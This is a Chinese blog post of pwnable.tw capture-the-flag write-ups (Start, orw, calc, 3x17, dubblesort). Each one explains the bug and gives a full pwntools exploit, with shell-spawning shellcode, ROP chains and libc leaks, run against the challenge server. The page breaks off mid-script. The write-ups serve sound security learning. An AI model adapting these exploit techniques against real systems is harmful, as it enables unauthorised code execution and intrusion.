<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pwnable.tw部分writeup(不定期更新) | Tover' Blog</title><meta name="keywords" content="PWN"><meta name="author" content="Tover. L"><meta name="copyright" content="Tover. L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如题">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.tw部分writeup(不定期更新)">
<meta property="og:url" content="https://tover.xyz/p/pwnable-tw-writeup/index.html">
<meta property="og:site_name" content="Tover&#39; Blog">
<meta property="og:description" content="如题">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tover.xyz/img/cai2.png">
<meta property="article:published_time" content="2019-10-29T12:53:35.000Z">
<meta property="article:modified_time" content="2023-02-05T06:43:47.245Z">
<meta property="article:author" content="Tover. L">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tover.xyz/img/cai2.png"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://tover.xyz/p/pwnable-tw-writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwnable.tw部分writeup(不定期更新)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-05 14:43:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tover' Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/../img/cai2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tover' Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwnable.tw部分writeup(不定期更新)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-29T12:53:35.000Z" title="发表于 2019-10-29 20:53:35">2019-10-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-05T06:43:47.245Z" title="更新于 2023-02-05 14:43:47">2023-02-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwnable.tw部分writeup(不定期更新)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/p/pwnable-tw-writeup/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>( 原文地址：<a target="_blank" rel="noopener" href="https://0xffff.one/d/410-pwnable-tw-bu-fen-writeup-bu-ding-qi-geng-xin">https://0xffff.one/d/410-pwnable-tw-bu-fen-writeup-bu-ding-qi-geng-xin</a> )</p>
<p>有的题还是比较有意思的<br>
(建议做了再看～)<br>
<a target="_blank" rel="noopener" href="https://pwnable.tw">传送门</a></p>
<h1>Start</h1>
<p>没什么好说的，网上随便找个shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./start&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;start the CTF:&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sh))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>))</span><br><span class="line">data = r.recv(<span class="number">4</span>)</span><br><span class="line">addr = u32(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil(&#x27;start the CTF:&#x27;)</span></span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(addr+<span class="number">0x14</span>)+sh)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>orw</h1>
<p>也是写shellcode，不过限制了syscall只能open, read, write，提示已经好明显了，就是先open打开文件拿到文件的fd，然后用read和fd把文件内容先读到一块地方(如.bss)，最后用write把这个地方的东西打印到stdout。有一点要注意的是read和write时的长度要大一点，不然程序会crash。</p>
<p>网上找不到现成的，只能自己写了。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804A0C0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss -&gt; &#x27;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line">l = <span class="number">40</span></span><br><span class="line">shellcode = [</span><br><span class="line">    <span class="string">&#x27;mov eax, 5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;push 0x00006761&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;push 0x6c662f77&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;push 0x726f2f65&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;push 0x6d6f682f&#x27;</span>,  <span class="comment"># really</span></span><br><span class="line">    <span class="comment">#&#x27;push 0x6d6f2f2e&#x27;,  # test</span></span><br><span class="line">    <span class="string">&#x27;mov ebx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xor ecx, ecx&#x27;</span>,  <span class="comment"># enmmm</span></span><br><span class="line">    <span class="string">&#x27;xor edx, edx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;mov ebx, eax&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ecx, &#x27;</span>+<span class="built_in">hex</span>(bss),</span><br><span class="line">    <span class="string">&#x27;mov edx, &#x27;</span>+<span class="built_in">str</span>(l),</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;mov eax, 4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, 1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ecx, &#x27;</span>+<span class="built_in">hex</span>(bss),</span><br><span class="line">    <span class="string">&#x27;mov edx, &#x27;</span>+<span class="built_in">str</span>(l),</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">sh = asm(<span class="string">&#x27;\r\n&#x27;</span>.join(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sh))</span><br><span class="line"></span><br><span class="line">r.sendline(sh)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<p>(exp上面有个test是本地测试是自己弄的文件夹，因为不想在自己电脑上的home目录里建文件夹)</p>
<p>不过这题比较有意思的一点是限制syscall的方式。在题目的orw_seccomp函数里调用了prctl函数。</p>
<img src="/p/pwnable-tw-writeup/2-1.png" class="" title="img_2-1">
<p>根据<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/prctl.2.html">这里</a>说的，prctl函数(好像是关于进程操作的函数?)通过第一个参数指定操作的类型，类型是PR_SET_SECCOMP的话会使线程进入“安全模式”(好像叫seccomp)，在这种模式下syscall被限制。</p>
<img src="/p/pwnable-tw-writeup/2-2.png" class="" title="img_2-2">
<h1>calc</h1>
<p>这题搞了一个简单<s>而且还会算错</s>的计算器，除了静态编译比较麻烦之外，洞其实还算好找的(吧)。calc的做法基本就是通过get_expr读算式(放到buffer里)，然后通过parse_expr把运算结果(和一些中间结果)放到一个pool的结构(第一个int是记录长度，后面100个int是放数)里面。parse_expr的做法大概是遍历buffer，把数字存pool，遇到运算符的话就用一个叫eval的函数做运算。(中间有些优先级的处理没详细看 - -)</p>
<p>漏洞就在eval里，里面有个数组越界(underflow)的漏洞，控制一下buf的length到1的话就会变成&quot;pool-&gt;buf[-1] += pool-&gt;buf[0]&quot;，pool-&gt;buf[-1]就是length，在这个时候是0，所以可通过 pool-&gt;buf[0]控制pool的length。</p>
<img src="/p/pwnable-tw-writeup/3-1.png" class="" title="img_3-1">
<p>然后在parse_expr里面有有个这样的东西，count因为length被控制了所以就被控制了，count被控制了就可以往任意的地址写入num。</p>
<img src="/p/pwnable-tw-writeup/3-2.png" class="" title="img_3-2">
<p>问题是num怎么被控制，后来发现算式如果第一个字符是运算符的话会有点问题，最终就构造了这样&quot;+bias+value&quot;的一个表达式，可以往(base_aderess+bias)的地址上写(value)这个值。最后写个rop就搞定了。不过还有一点要注意的是不能写0，但可以通过写1再dec来绕过。</p>
<img src="/p/pwnable-tw-writeup/3-3.png" class="" title="img_3-3">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.sendline(&#x27;+12345+0\x10&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">bias,value</span>):</span></span><br><span class="line">    r.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(bias)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeROP</span>(<span class="params">chain</span>):</span></span><br><span class="line">    count = <span class="number">360</span></span><br><span class="line">    clen = <span class="built_in">len</span>(chain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(clen)[::-<span class="number">1</span>]:</span><br><span class="line">        write(count+i,chain[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int80_ret = <span class="number">0x08070880</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_ebx = <span class="number">0x080481d1</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x080701d1</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span></span><br><span class="line">push_esp = <span class="number">0x080bc556</span></span><br><span class="line">add_esp_12 = <span class="number">0x080915e8</span></span><br><span class="line">mov_eaxm_edx = <span class="number">0x0807cc01</span></span><br><span class="line">dec_edx = <span class="number">0x080e72e3</span></span><br><span class="line">dec_ecx = <span class="number">0x0806f4eb</span></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x0068732f</span></span><br><span class="line">bn = <span class="number">0x6e69622f</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x080EE380</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss -&gt; &#x27;</span>+<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">chain = [</span><br><span class="line">    pop_eax,bss,pop_edx,bn,mov_eaxm_edx,</span><br><span class="line">    pop_eax,bss+<span class="number">4</span>,pop_edx,sh,mov_eaxm_edx,</span><br><span class="line">    pop_eax,<span class="number">11</span>,pop_ecx_ebx,<span class="number">1</span>,bss,dec_ecx,pop_edx,<span class="number">1</span>,dec_edx,</span><br><span class="line">    int80_ret</span><br><span class="line">]</span><br><span class="line">writeROP(chain)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>3x17</h1>
<p>题目的3x17是什么意思我到现在都搞不明白 - -。静态编译加stripped看着有点难受，把题逆完之后知道只有一个main函数，可以输入一个地址，然后往这个地址写东西(3 bytes)，还有个奇怪的count。</p>
<img src="/p/pwnable-tw-writeup/4-1.png" class="" title="img_4-1">
<p>没有信息泄漏，不知道要写什么- -，后来在@“Potatso”#109 那里听说了_fini_array这个东西，就是程序在结束前会经过一个叫_libc_csu_fini的函数，这个函数会取_fini_array里面的函数(函数指针)出来执行，然后才让程序结束。</p>
<img src="/p/pwnable-tw-writeup/4-2.png" class="" title="img_4-2">
<p>所以通过修改_fini_array的函数就可以在main函数后多执行两个函数(因为有个v0限制)，本来想如果写个main函数在_fini_array的话就可以返回main实现无数次写了，但main里面有个count限制。后来发现可以第一个函数写main，第二个函数写_libc_csu_fini的话就可以无数次进入main函数，让count溢出变回1。(有一点要注意的是_fini_array里面的函数是逆序执行的)。</p>
<p>所以就实现了无数次的任意位置写，于是就想写个rop，但不知道写哪里。后来发现在执行_fini_array前的rbp就是指向_fini_array(0x4b40f0)的，所以就往这里写了个&quot;leave&quot;，然后栈被移到0x4b40e8，在0x4b40e8放个&quot;add rsp,0x18&quot;的rop的话，0x4b4100后面就可以放个rop chain了。后来这么做是成功了，最后的rop：</p>
<img src="/p/pwnable-tw-writeup/4-3.png" class="" title="img_4-3">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;addr:&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">str</span>(addr).ljust(<span class="number">24</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;data:&#x27;</span>)</span><br><span class="line">    r.send((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p64,data))).ljust(<span class="number">24</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">csu_fini = <span class="number">0x402960</span></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line"></span><br><span class="line">add_rsp_0x18 = <span class="number">0x4477c8</span></span><br><span class="line">leave_ret = <span class="number">0x401c4b</span></span><br><span class="line">ret = <span class="number">0x401C4C</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">syscall = <span class="number">0x471db5</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x4B40E8</span>,[add_rsp_0x18,csu_fini,main])  <span class="comment"># endless loop</span></span><br><span class="line">rop = <span class="number">0x4B4100</span></span><br><span class="line">write(rop,    [pop_rax,<span class="number">0x3b</span>,pop_rdi])</span><br><span class="line">write(rop+<span class="number">8</span>*<span class="number">3</span>,[rop+<span class="number">8</span>*<span class="number">9</span>,pop_rsi,<span class="number">0</span>])</span><br><span class="line">write(rop+<span class="number">8</span>*<span class="number">6</span>,[pop_rdx,<span class="number">0</span>,syscall])</span><br><span class="line">write(rop+<span class="number">8</span>*<span class="number">9</span>,[<span class="number">0x0068732f6e69622f</span>])</span><br><span class="line">raw_input(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">write(<span class="number">0x4B40f0</span>,[leave_ret,ret,pop_rax])  <span class="comment"># hack =&gt; rop 0x4b4100</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>dubblesort</h1>
<p>实际上就是个bubble sort，输入排序数字的数量，然后输入数字，输出排序结果。</p>
<img src="/p/pwnable-tw-writeup/5-1.png" class="" title="img_5-1">
<p>开局输个名字送libc_base:</p>
<img src="/p/pwnable-tw-writeup/5-2.png" class="" title="img_5-2">
<p>这题利用技巧在于输入非数字的话会输入不成功，结果是用栈上的东西来排序。加上有栈溢出漏洞，就可以构造特定的ROP了。(由于有排序，会对ROP有一定要求，但是libc里面有大量的ROP，构造还是不太难的)</p>
<img src="/p/pwnable-tw-writeup/5-3.png" class="" title="img_5-3">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;What your name :&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">libc_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x1ae244</span></span><br><span class="line">code_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x601</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [LEAK]libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [LEAK]code_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">nums = <span class="number">46</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;what to sort :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(nums))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):  <span class="comment"># canary &gt; code_base+?</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(libc_base))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x3a940</span></span><br><span class="line">pop_ecx = <span class="number">0xb3eb7</span></span><br><span class="line">bin_sh = <span class="number">0x158e8b</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_base+system))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_base+pop_ecx))</span><br><span class="line">r.sendline(<span 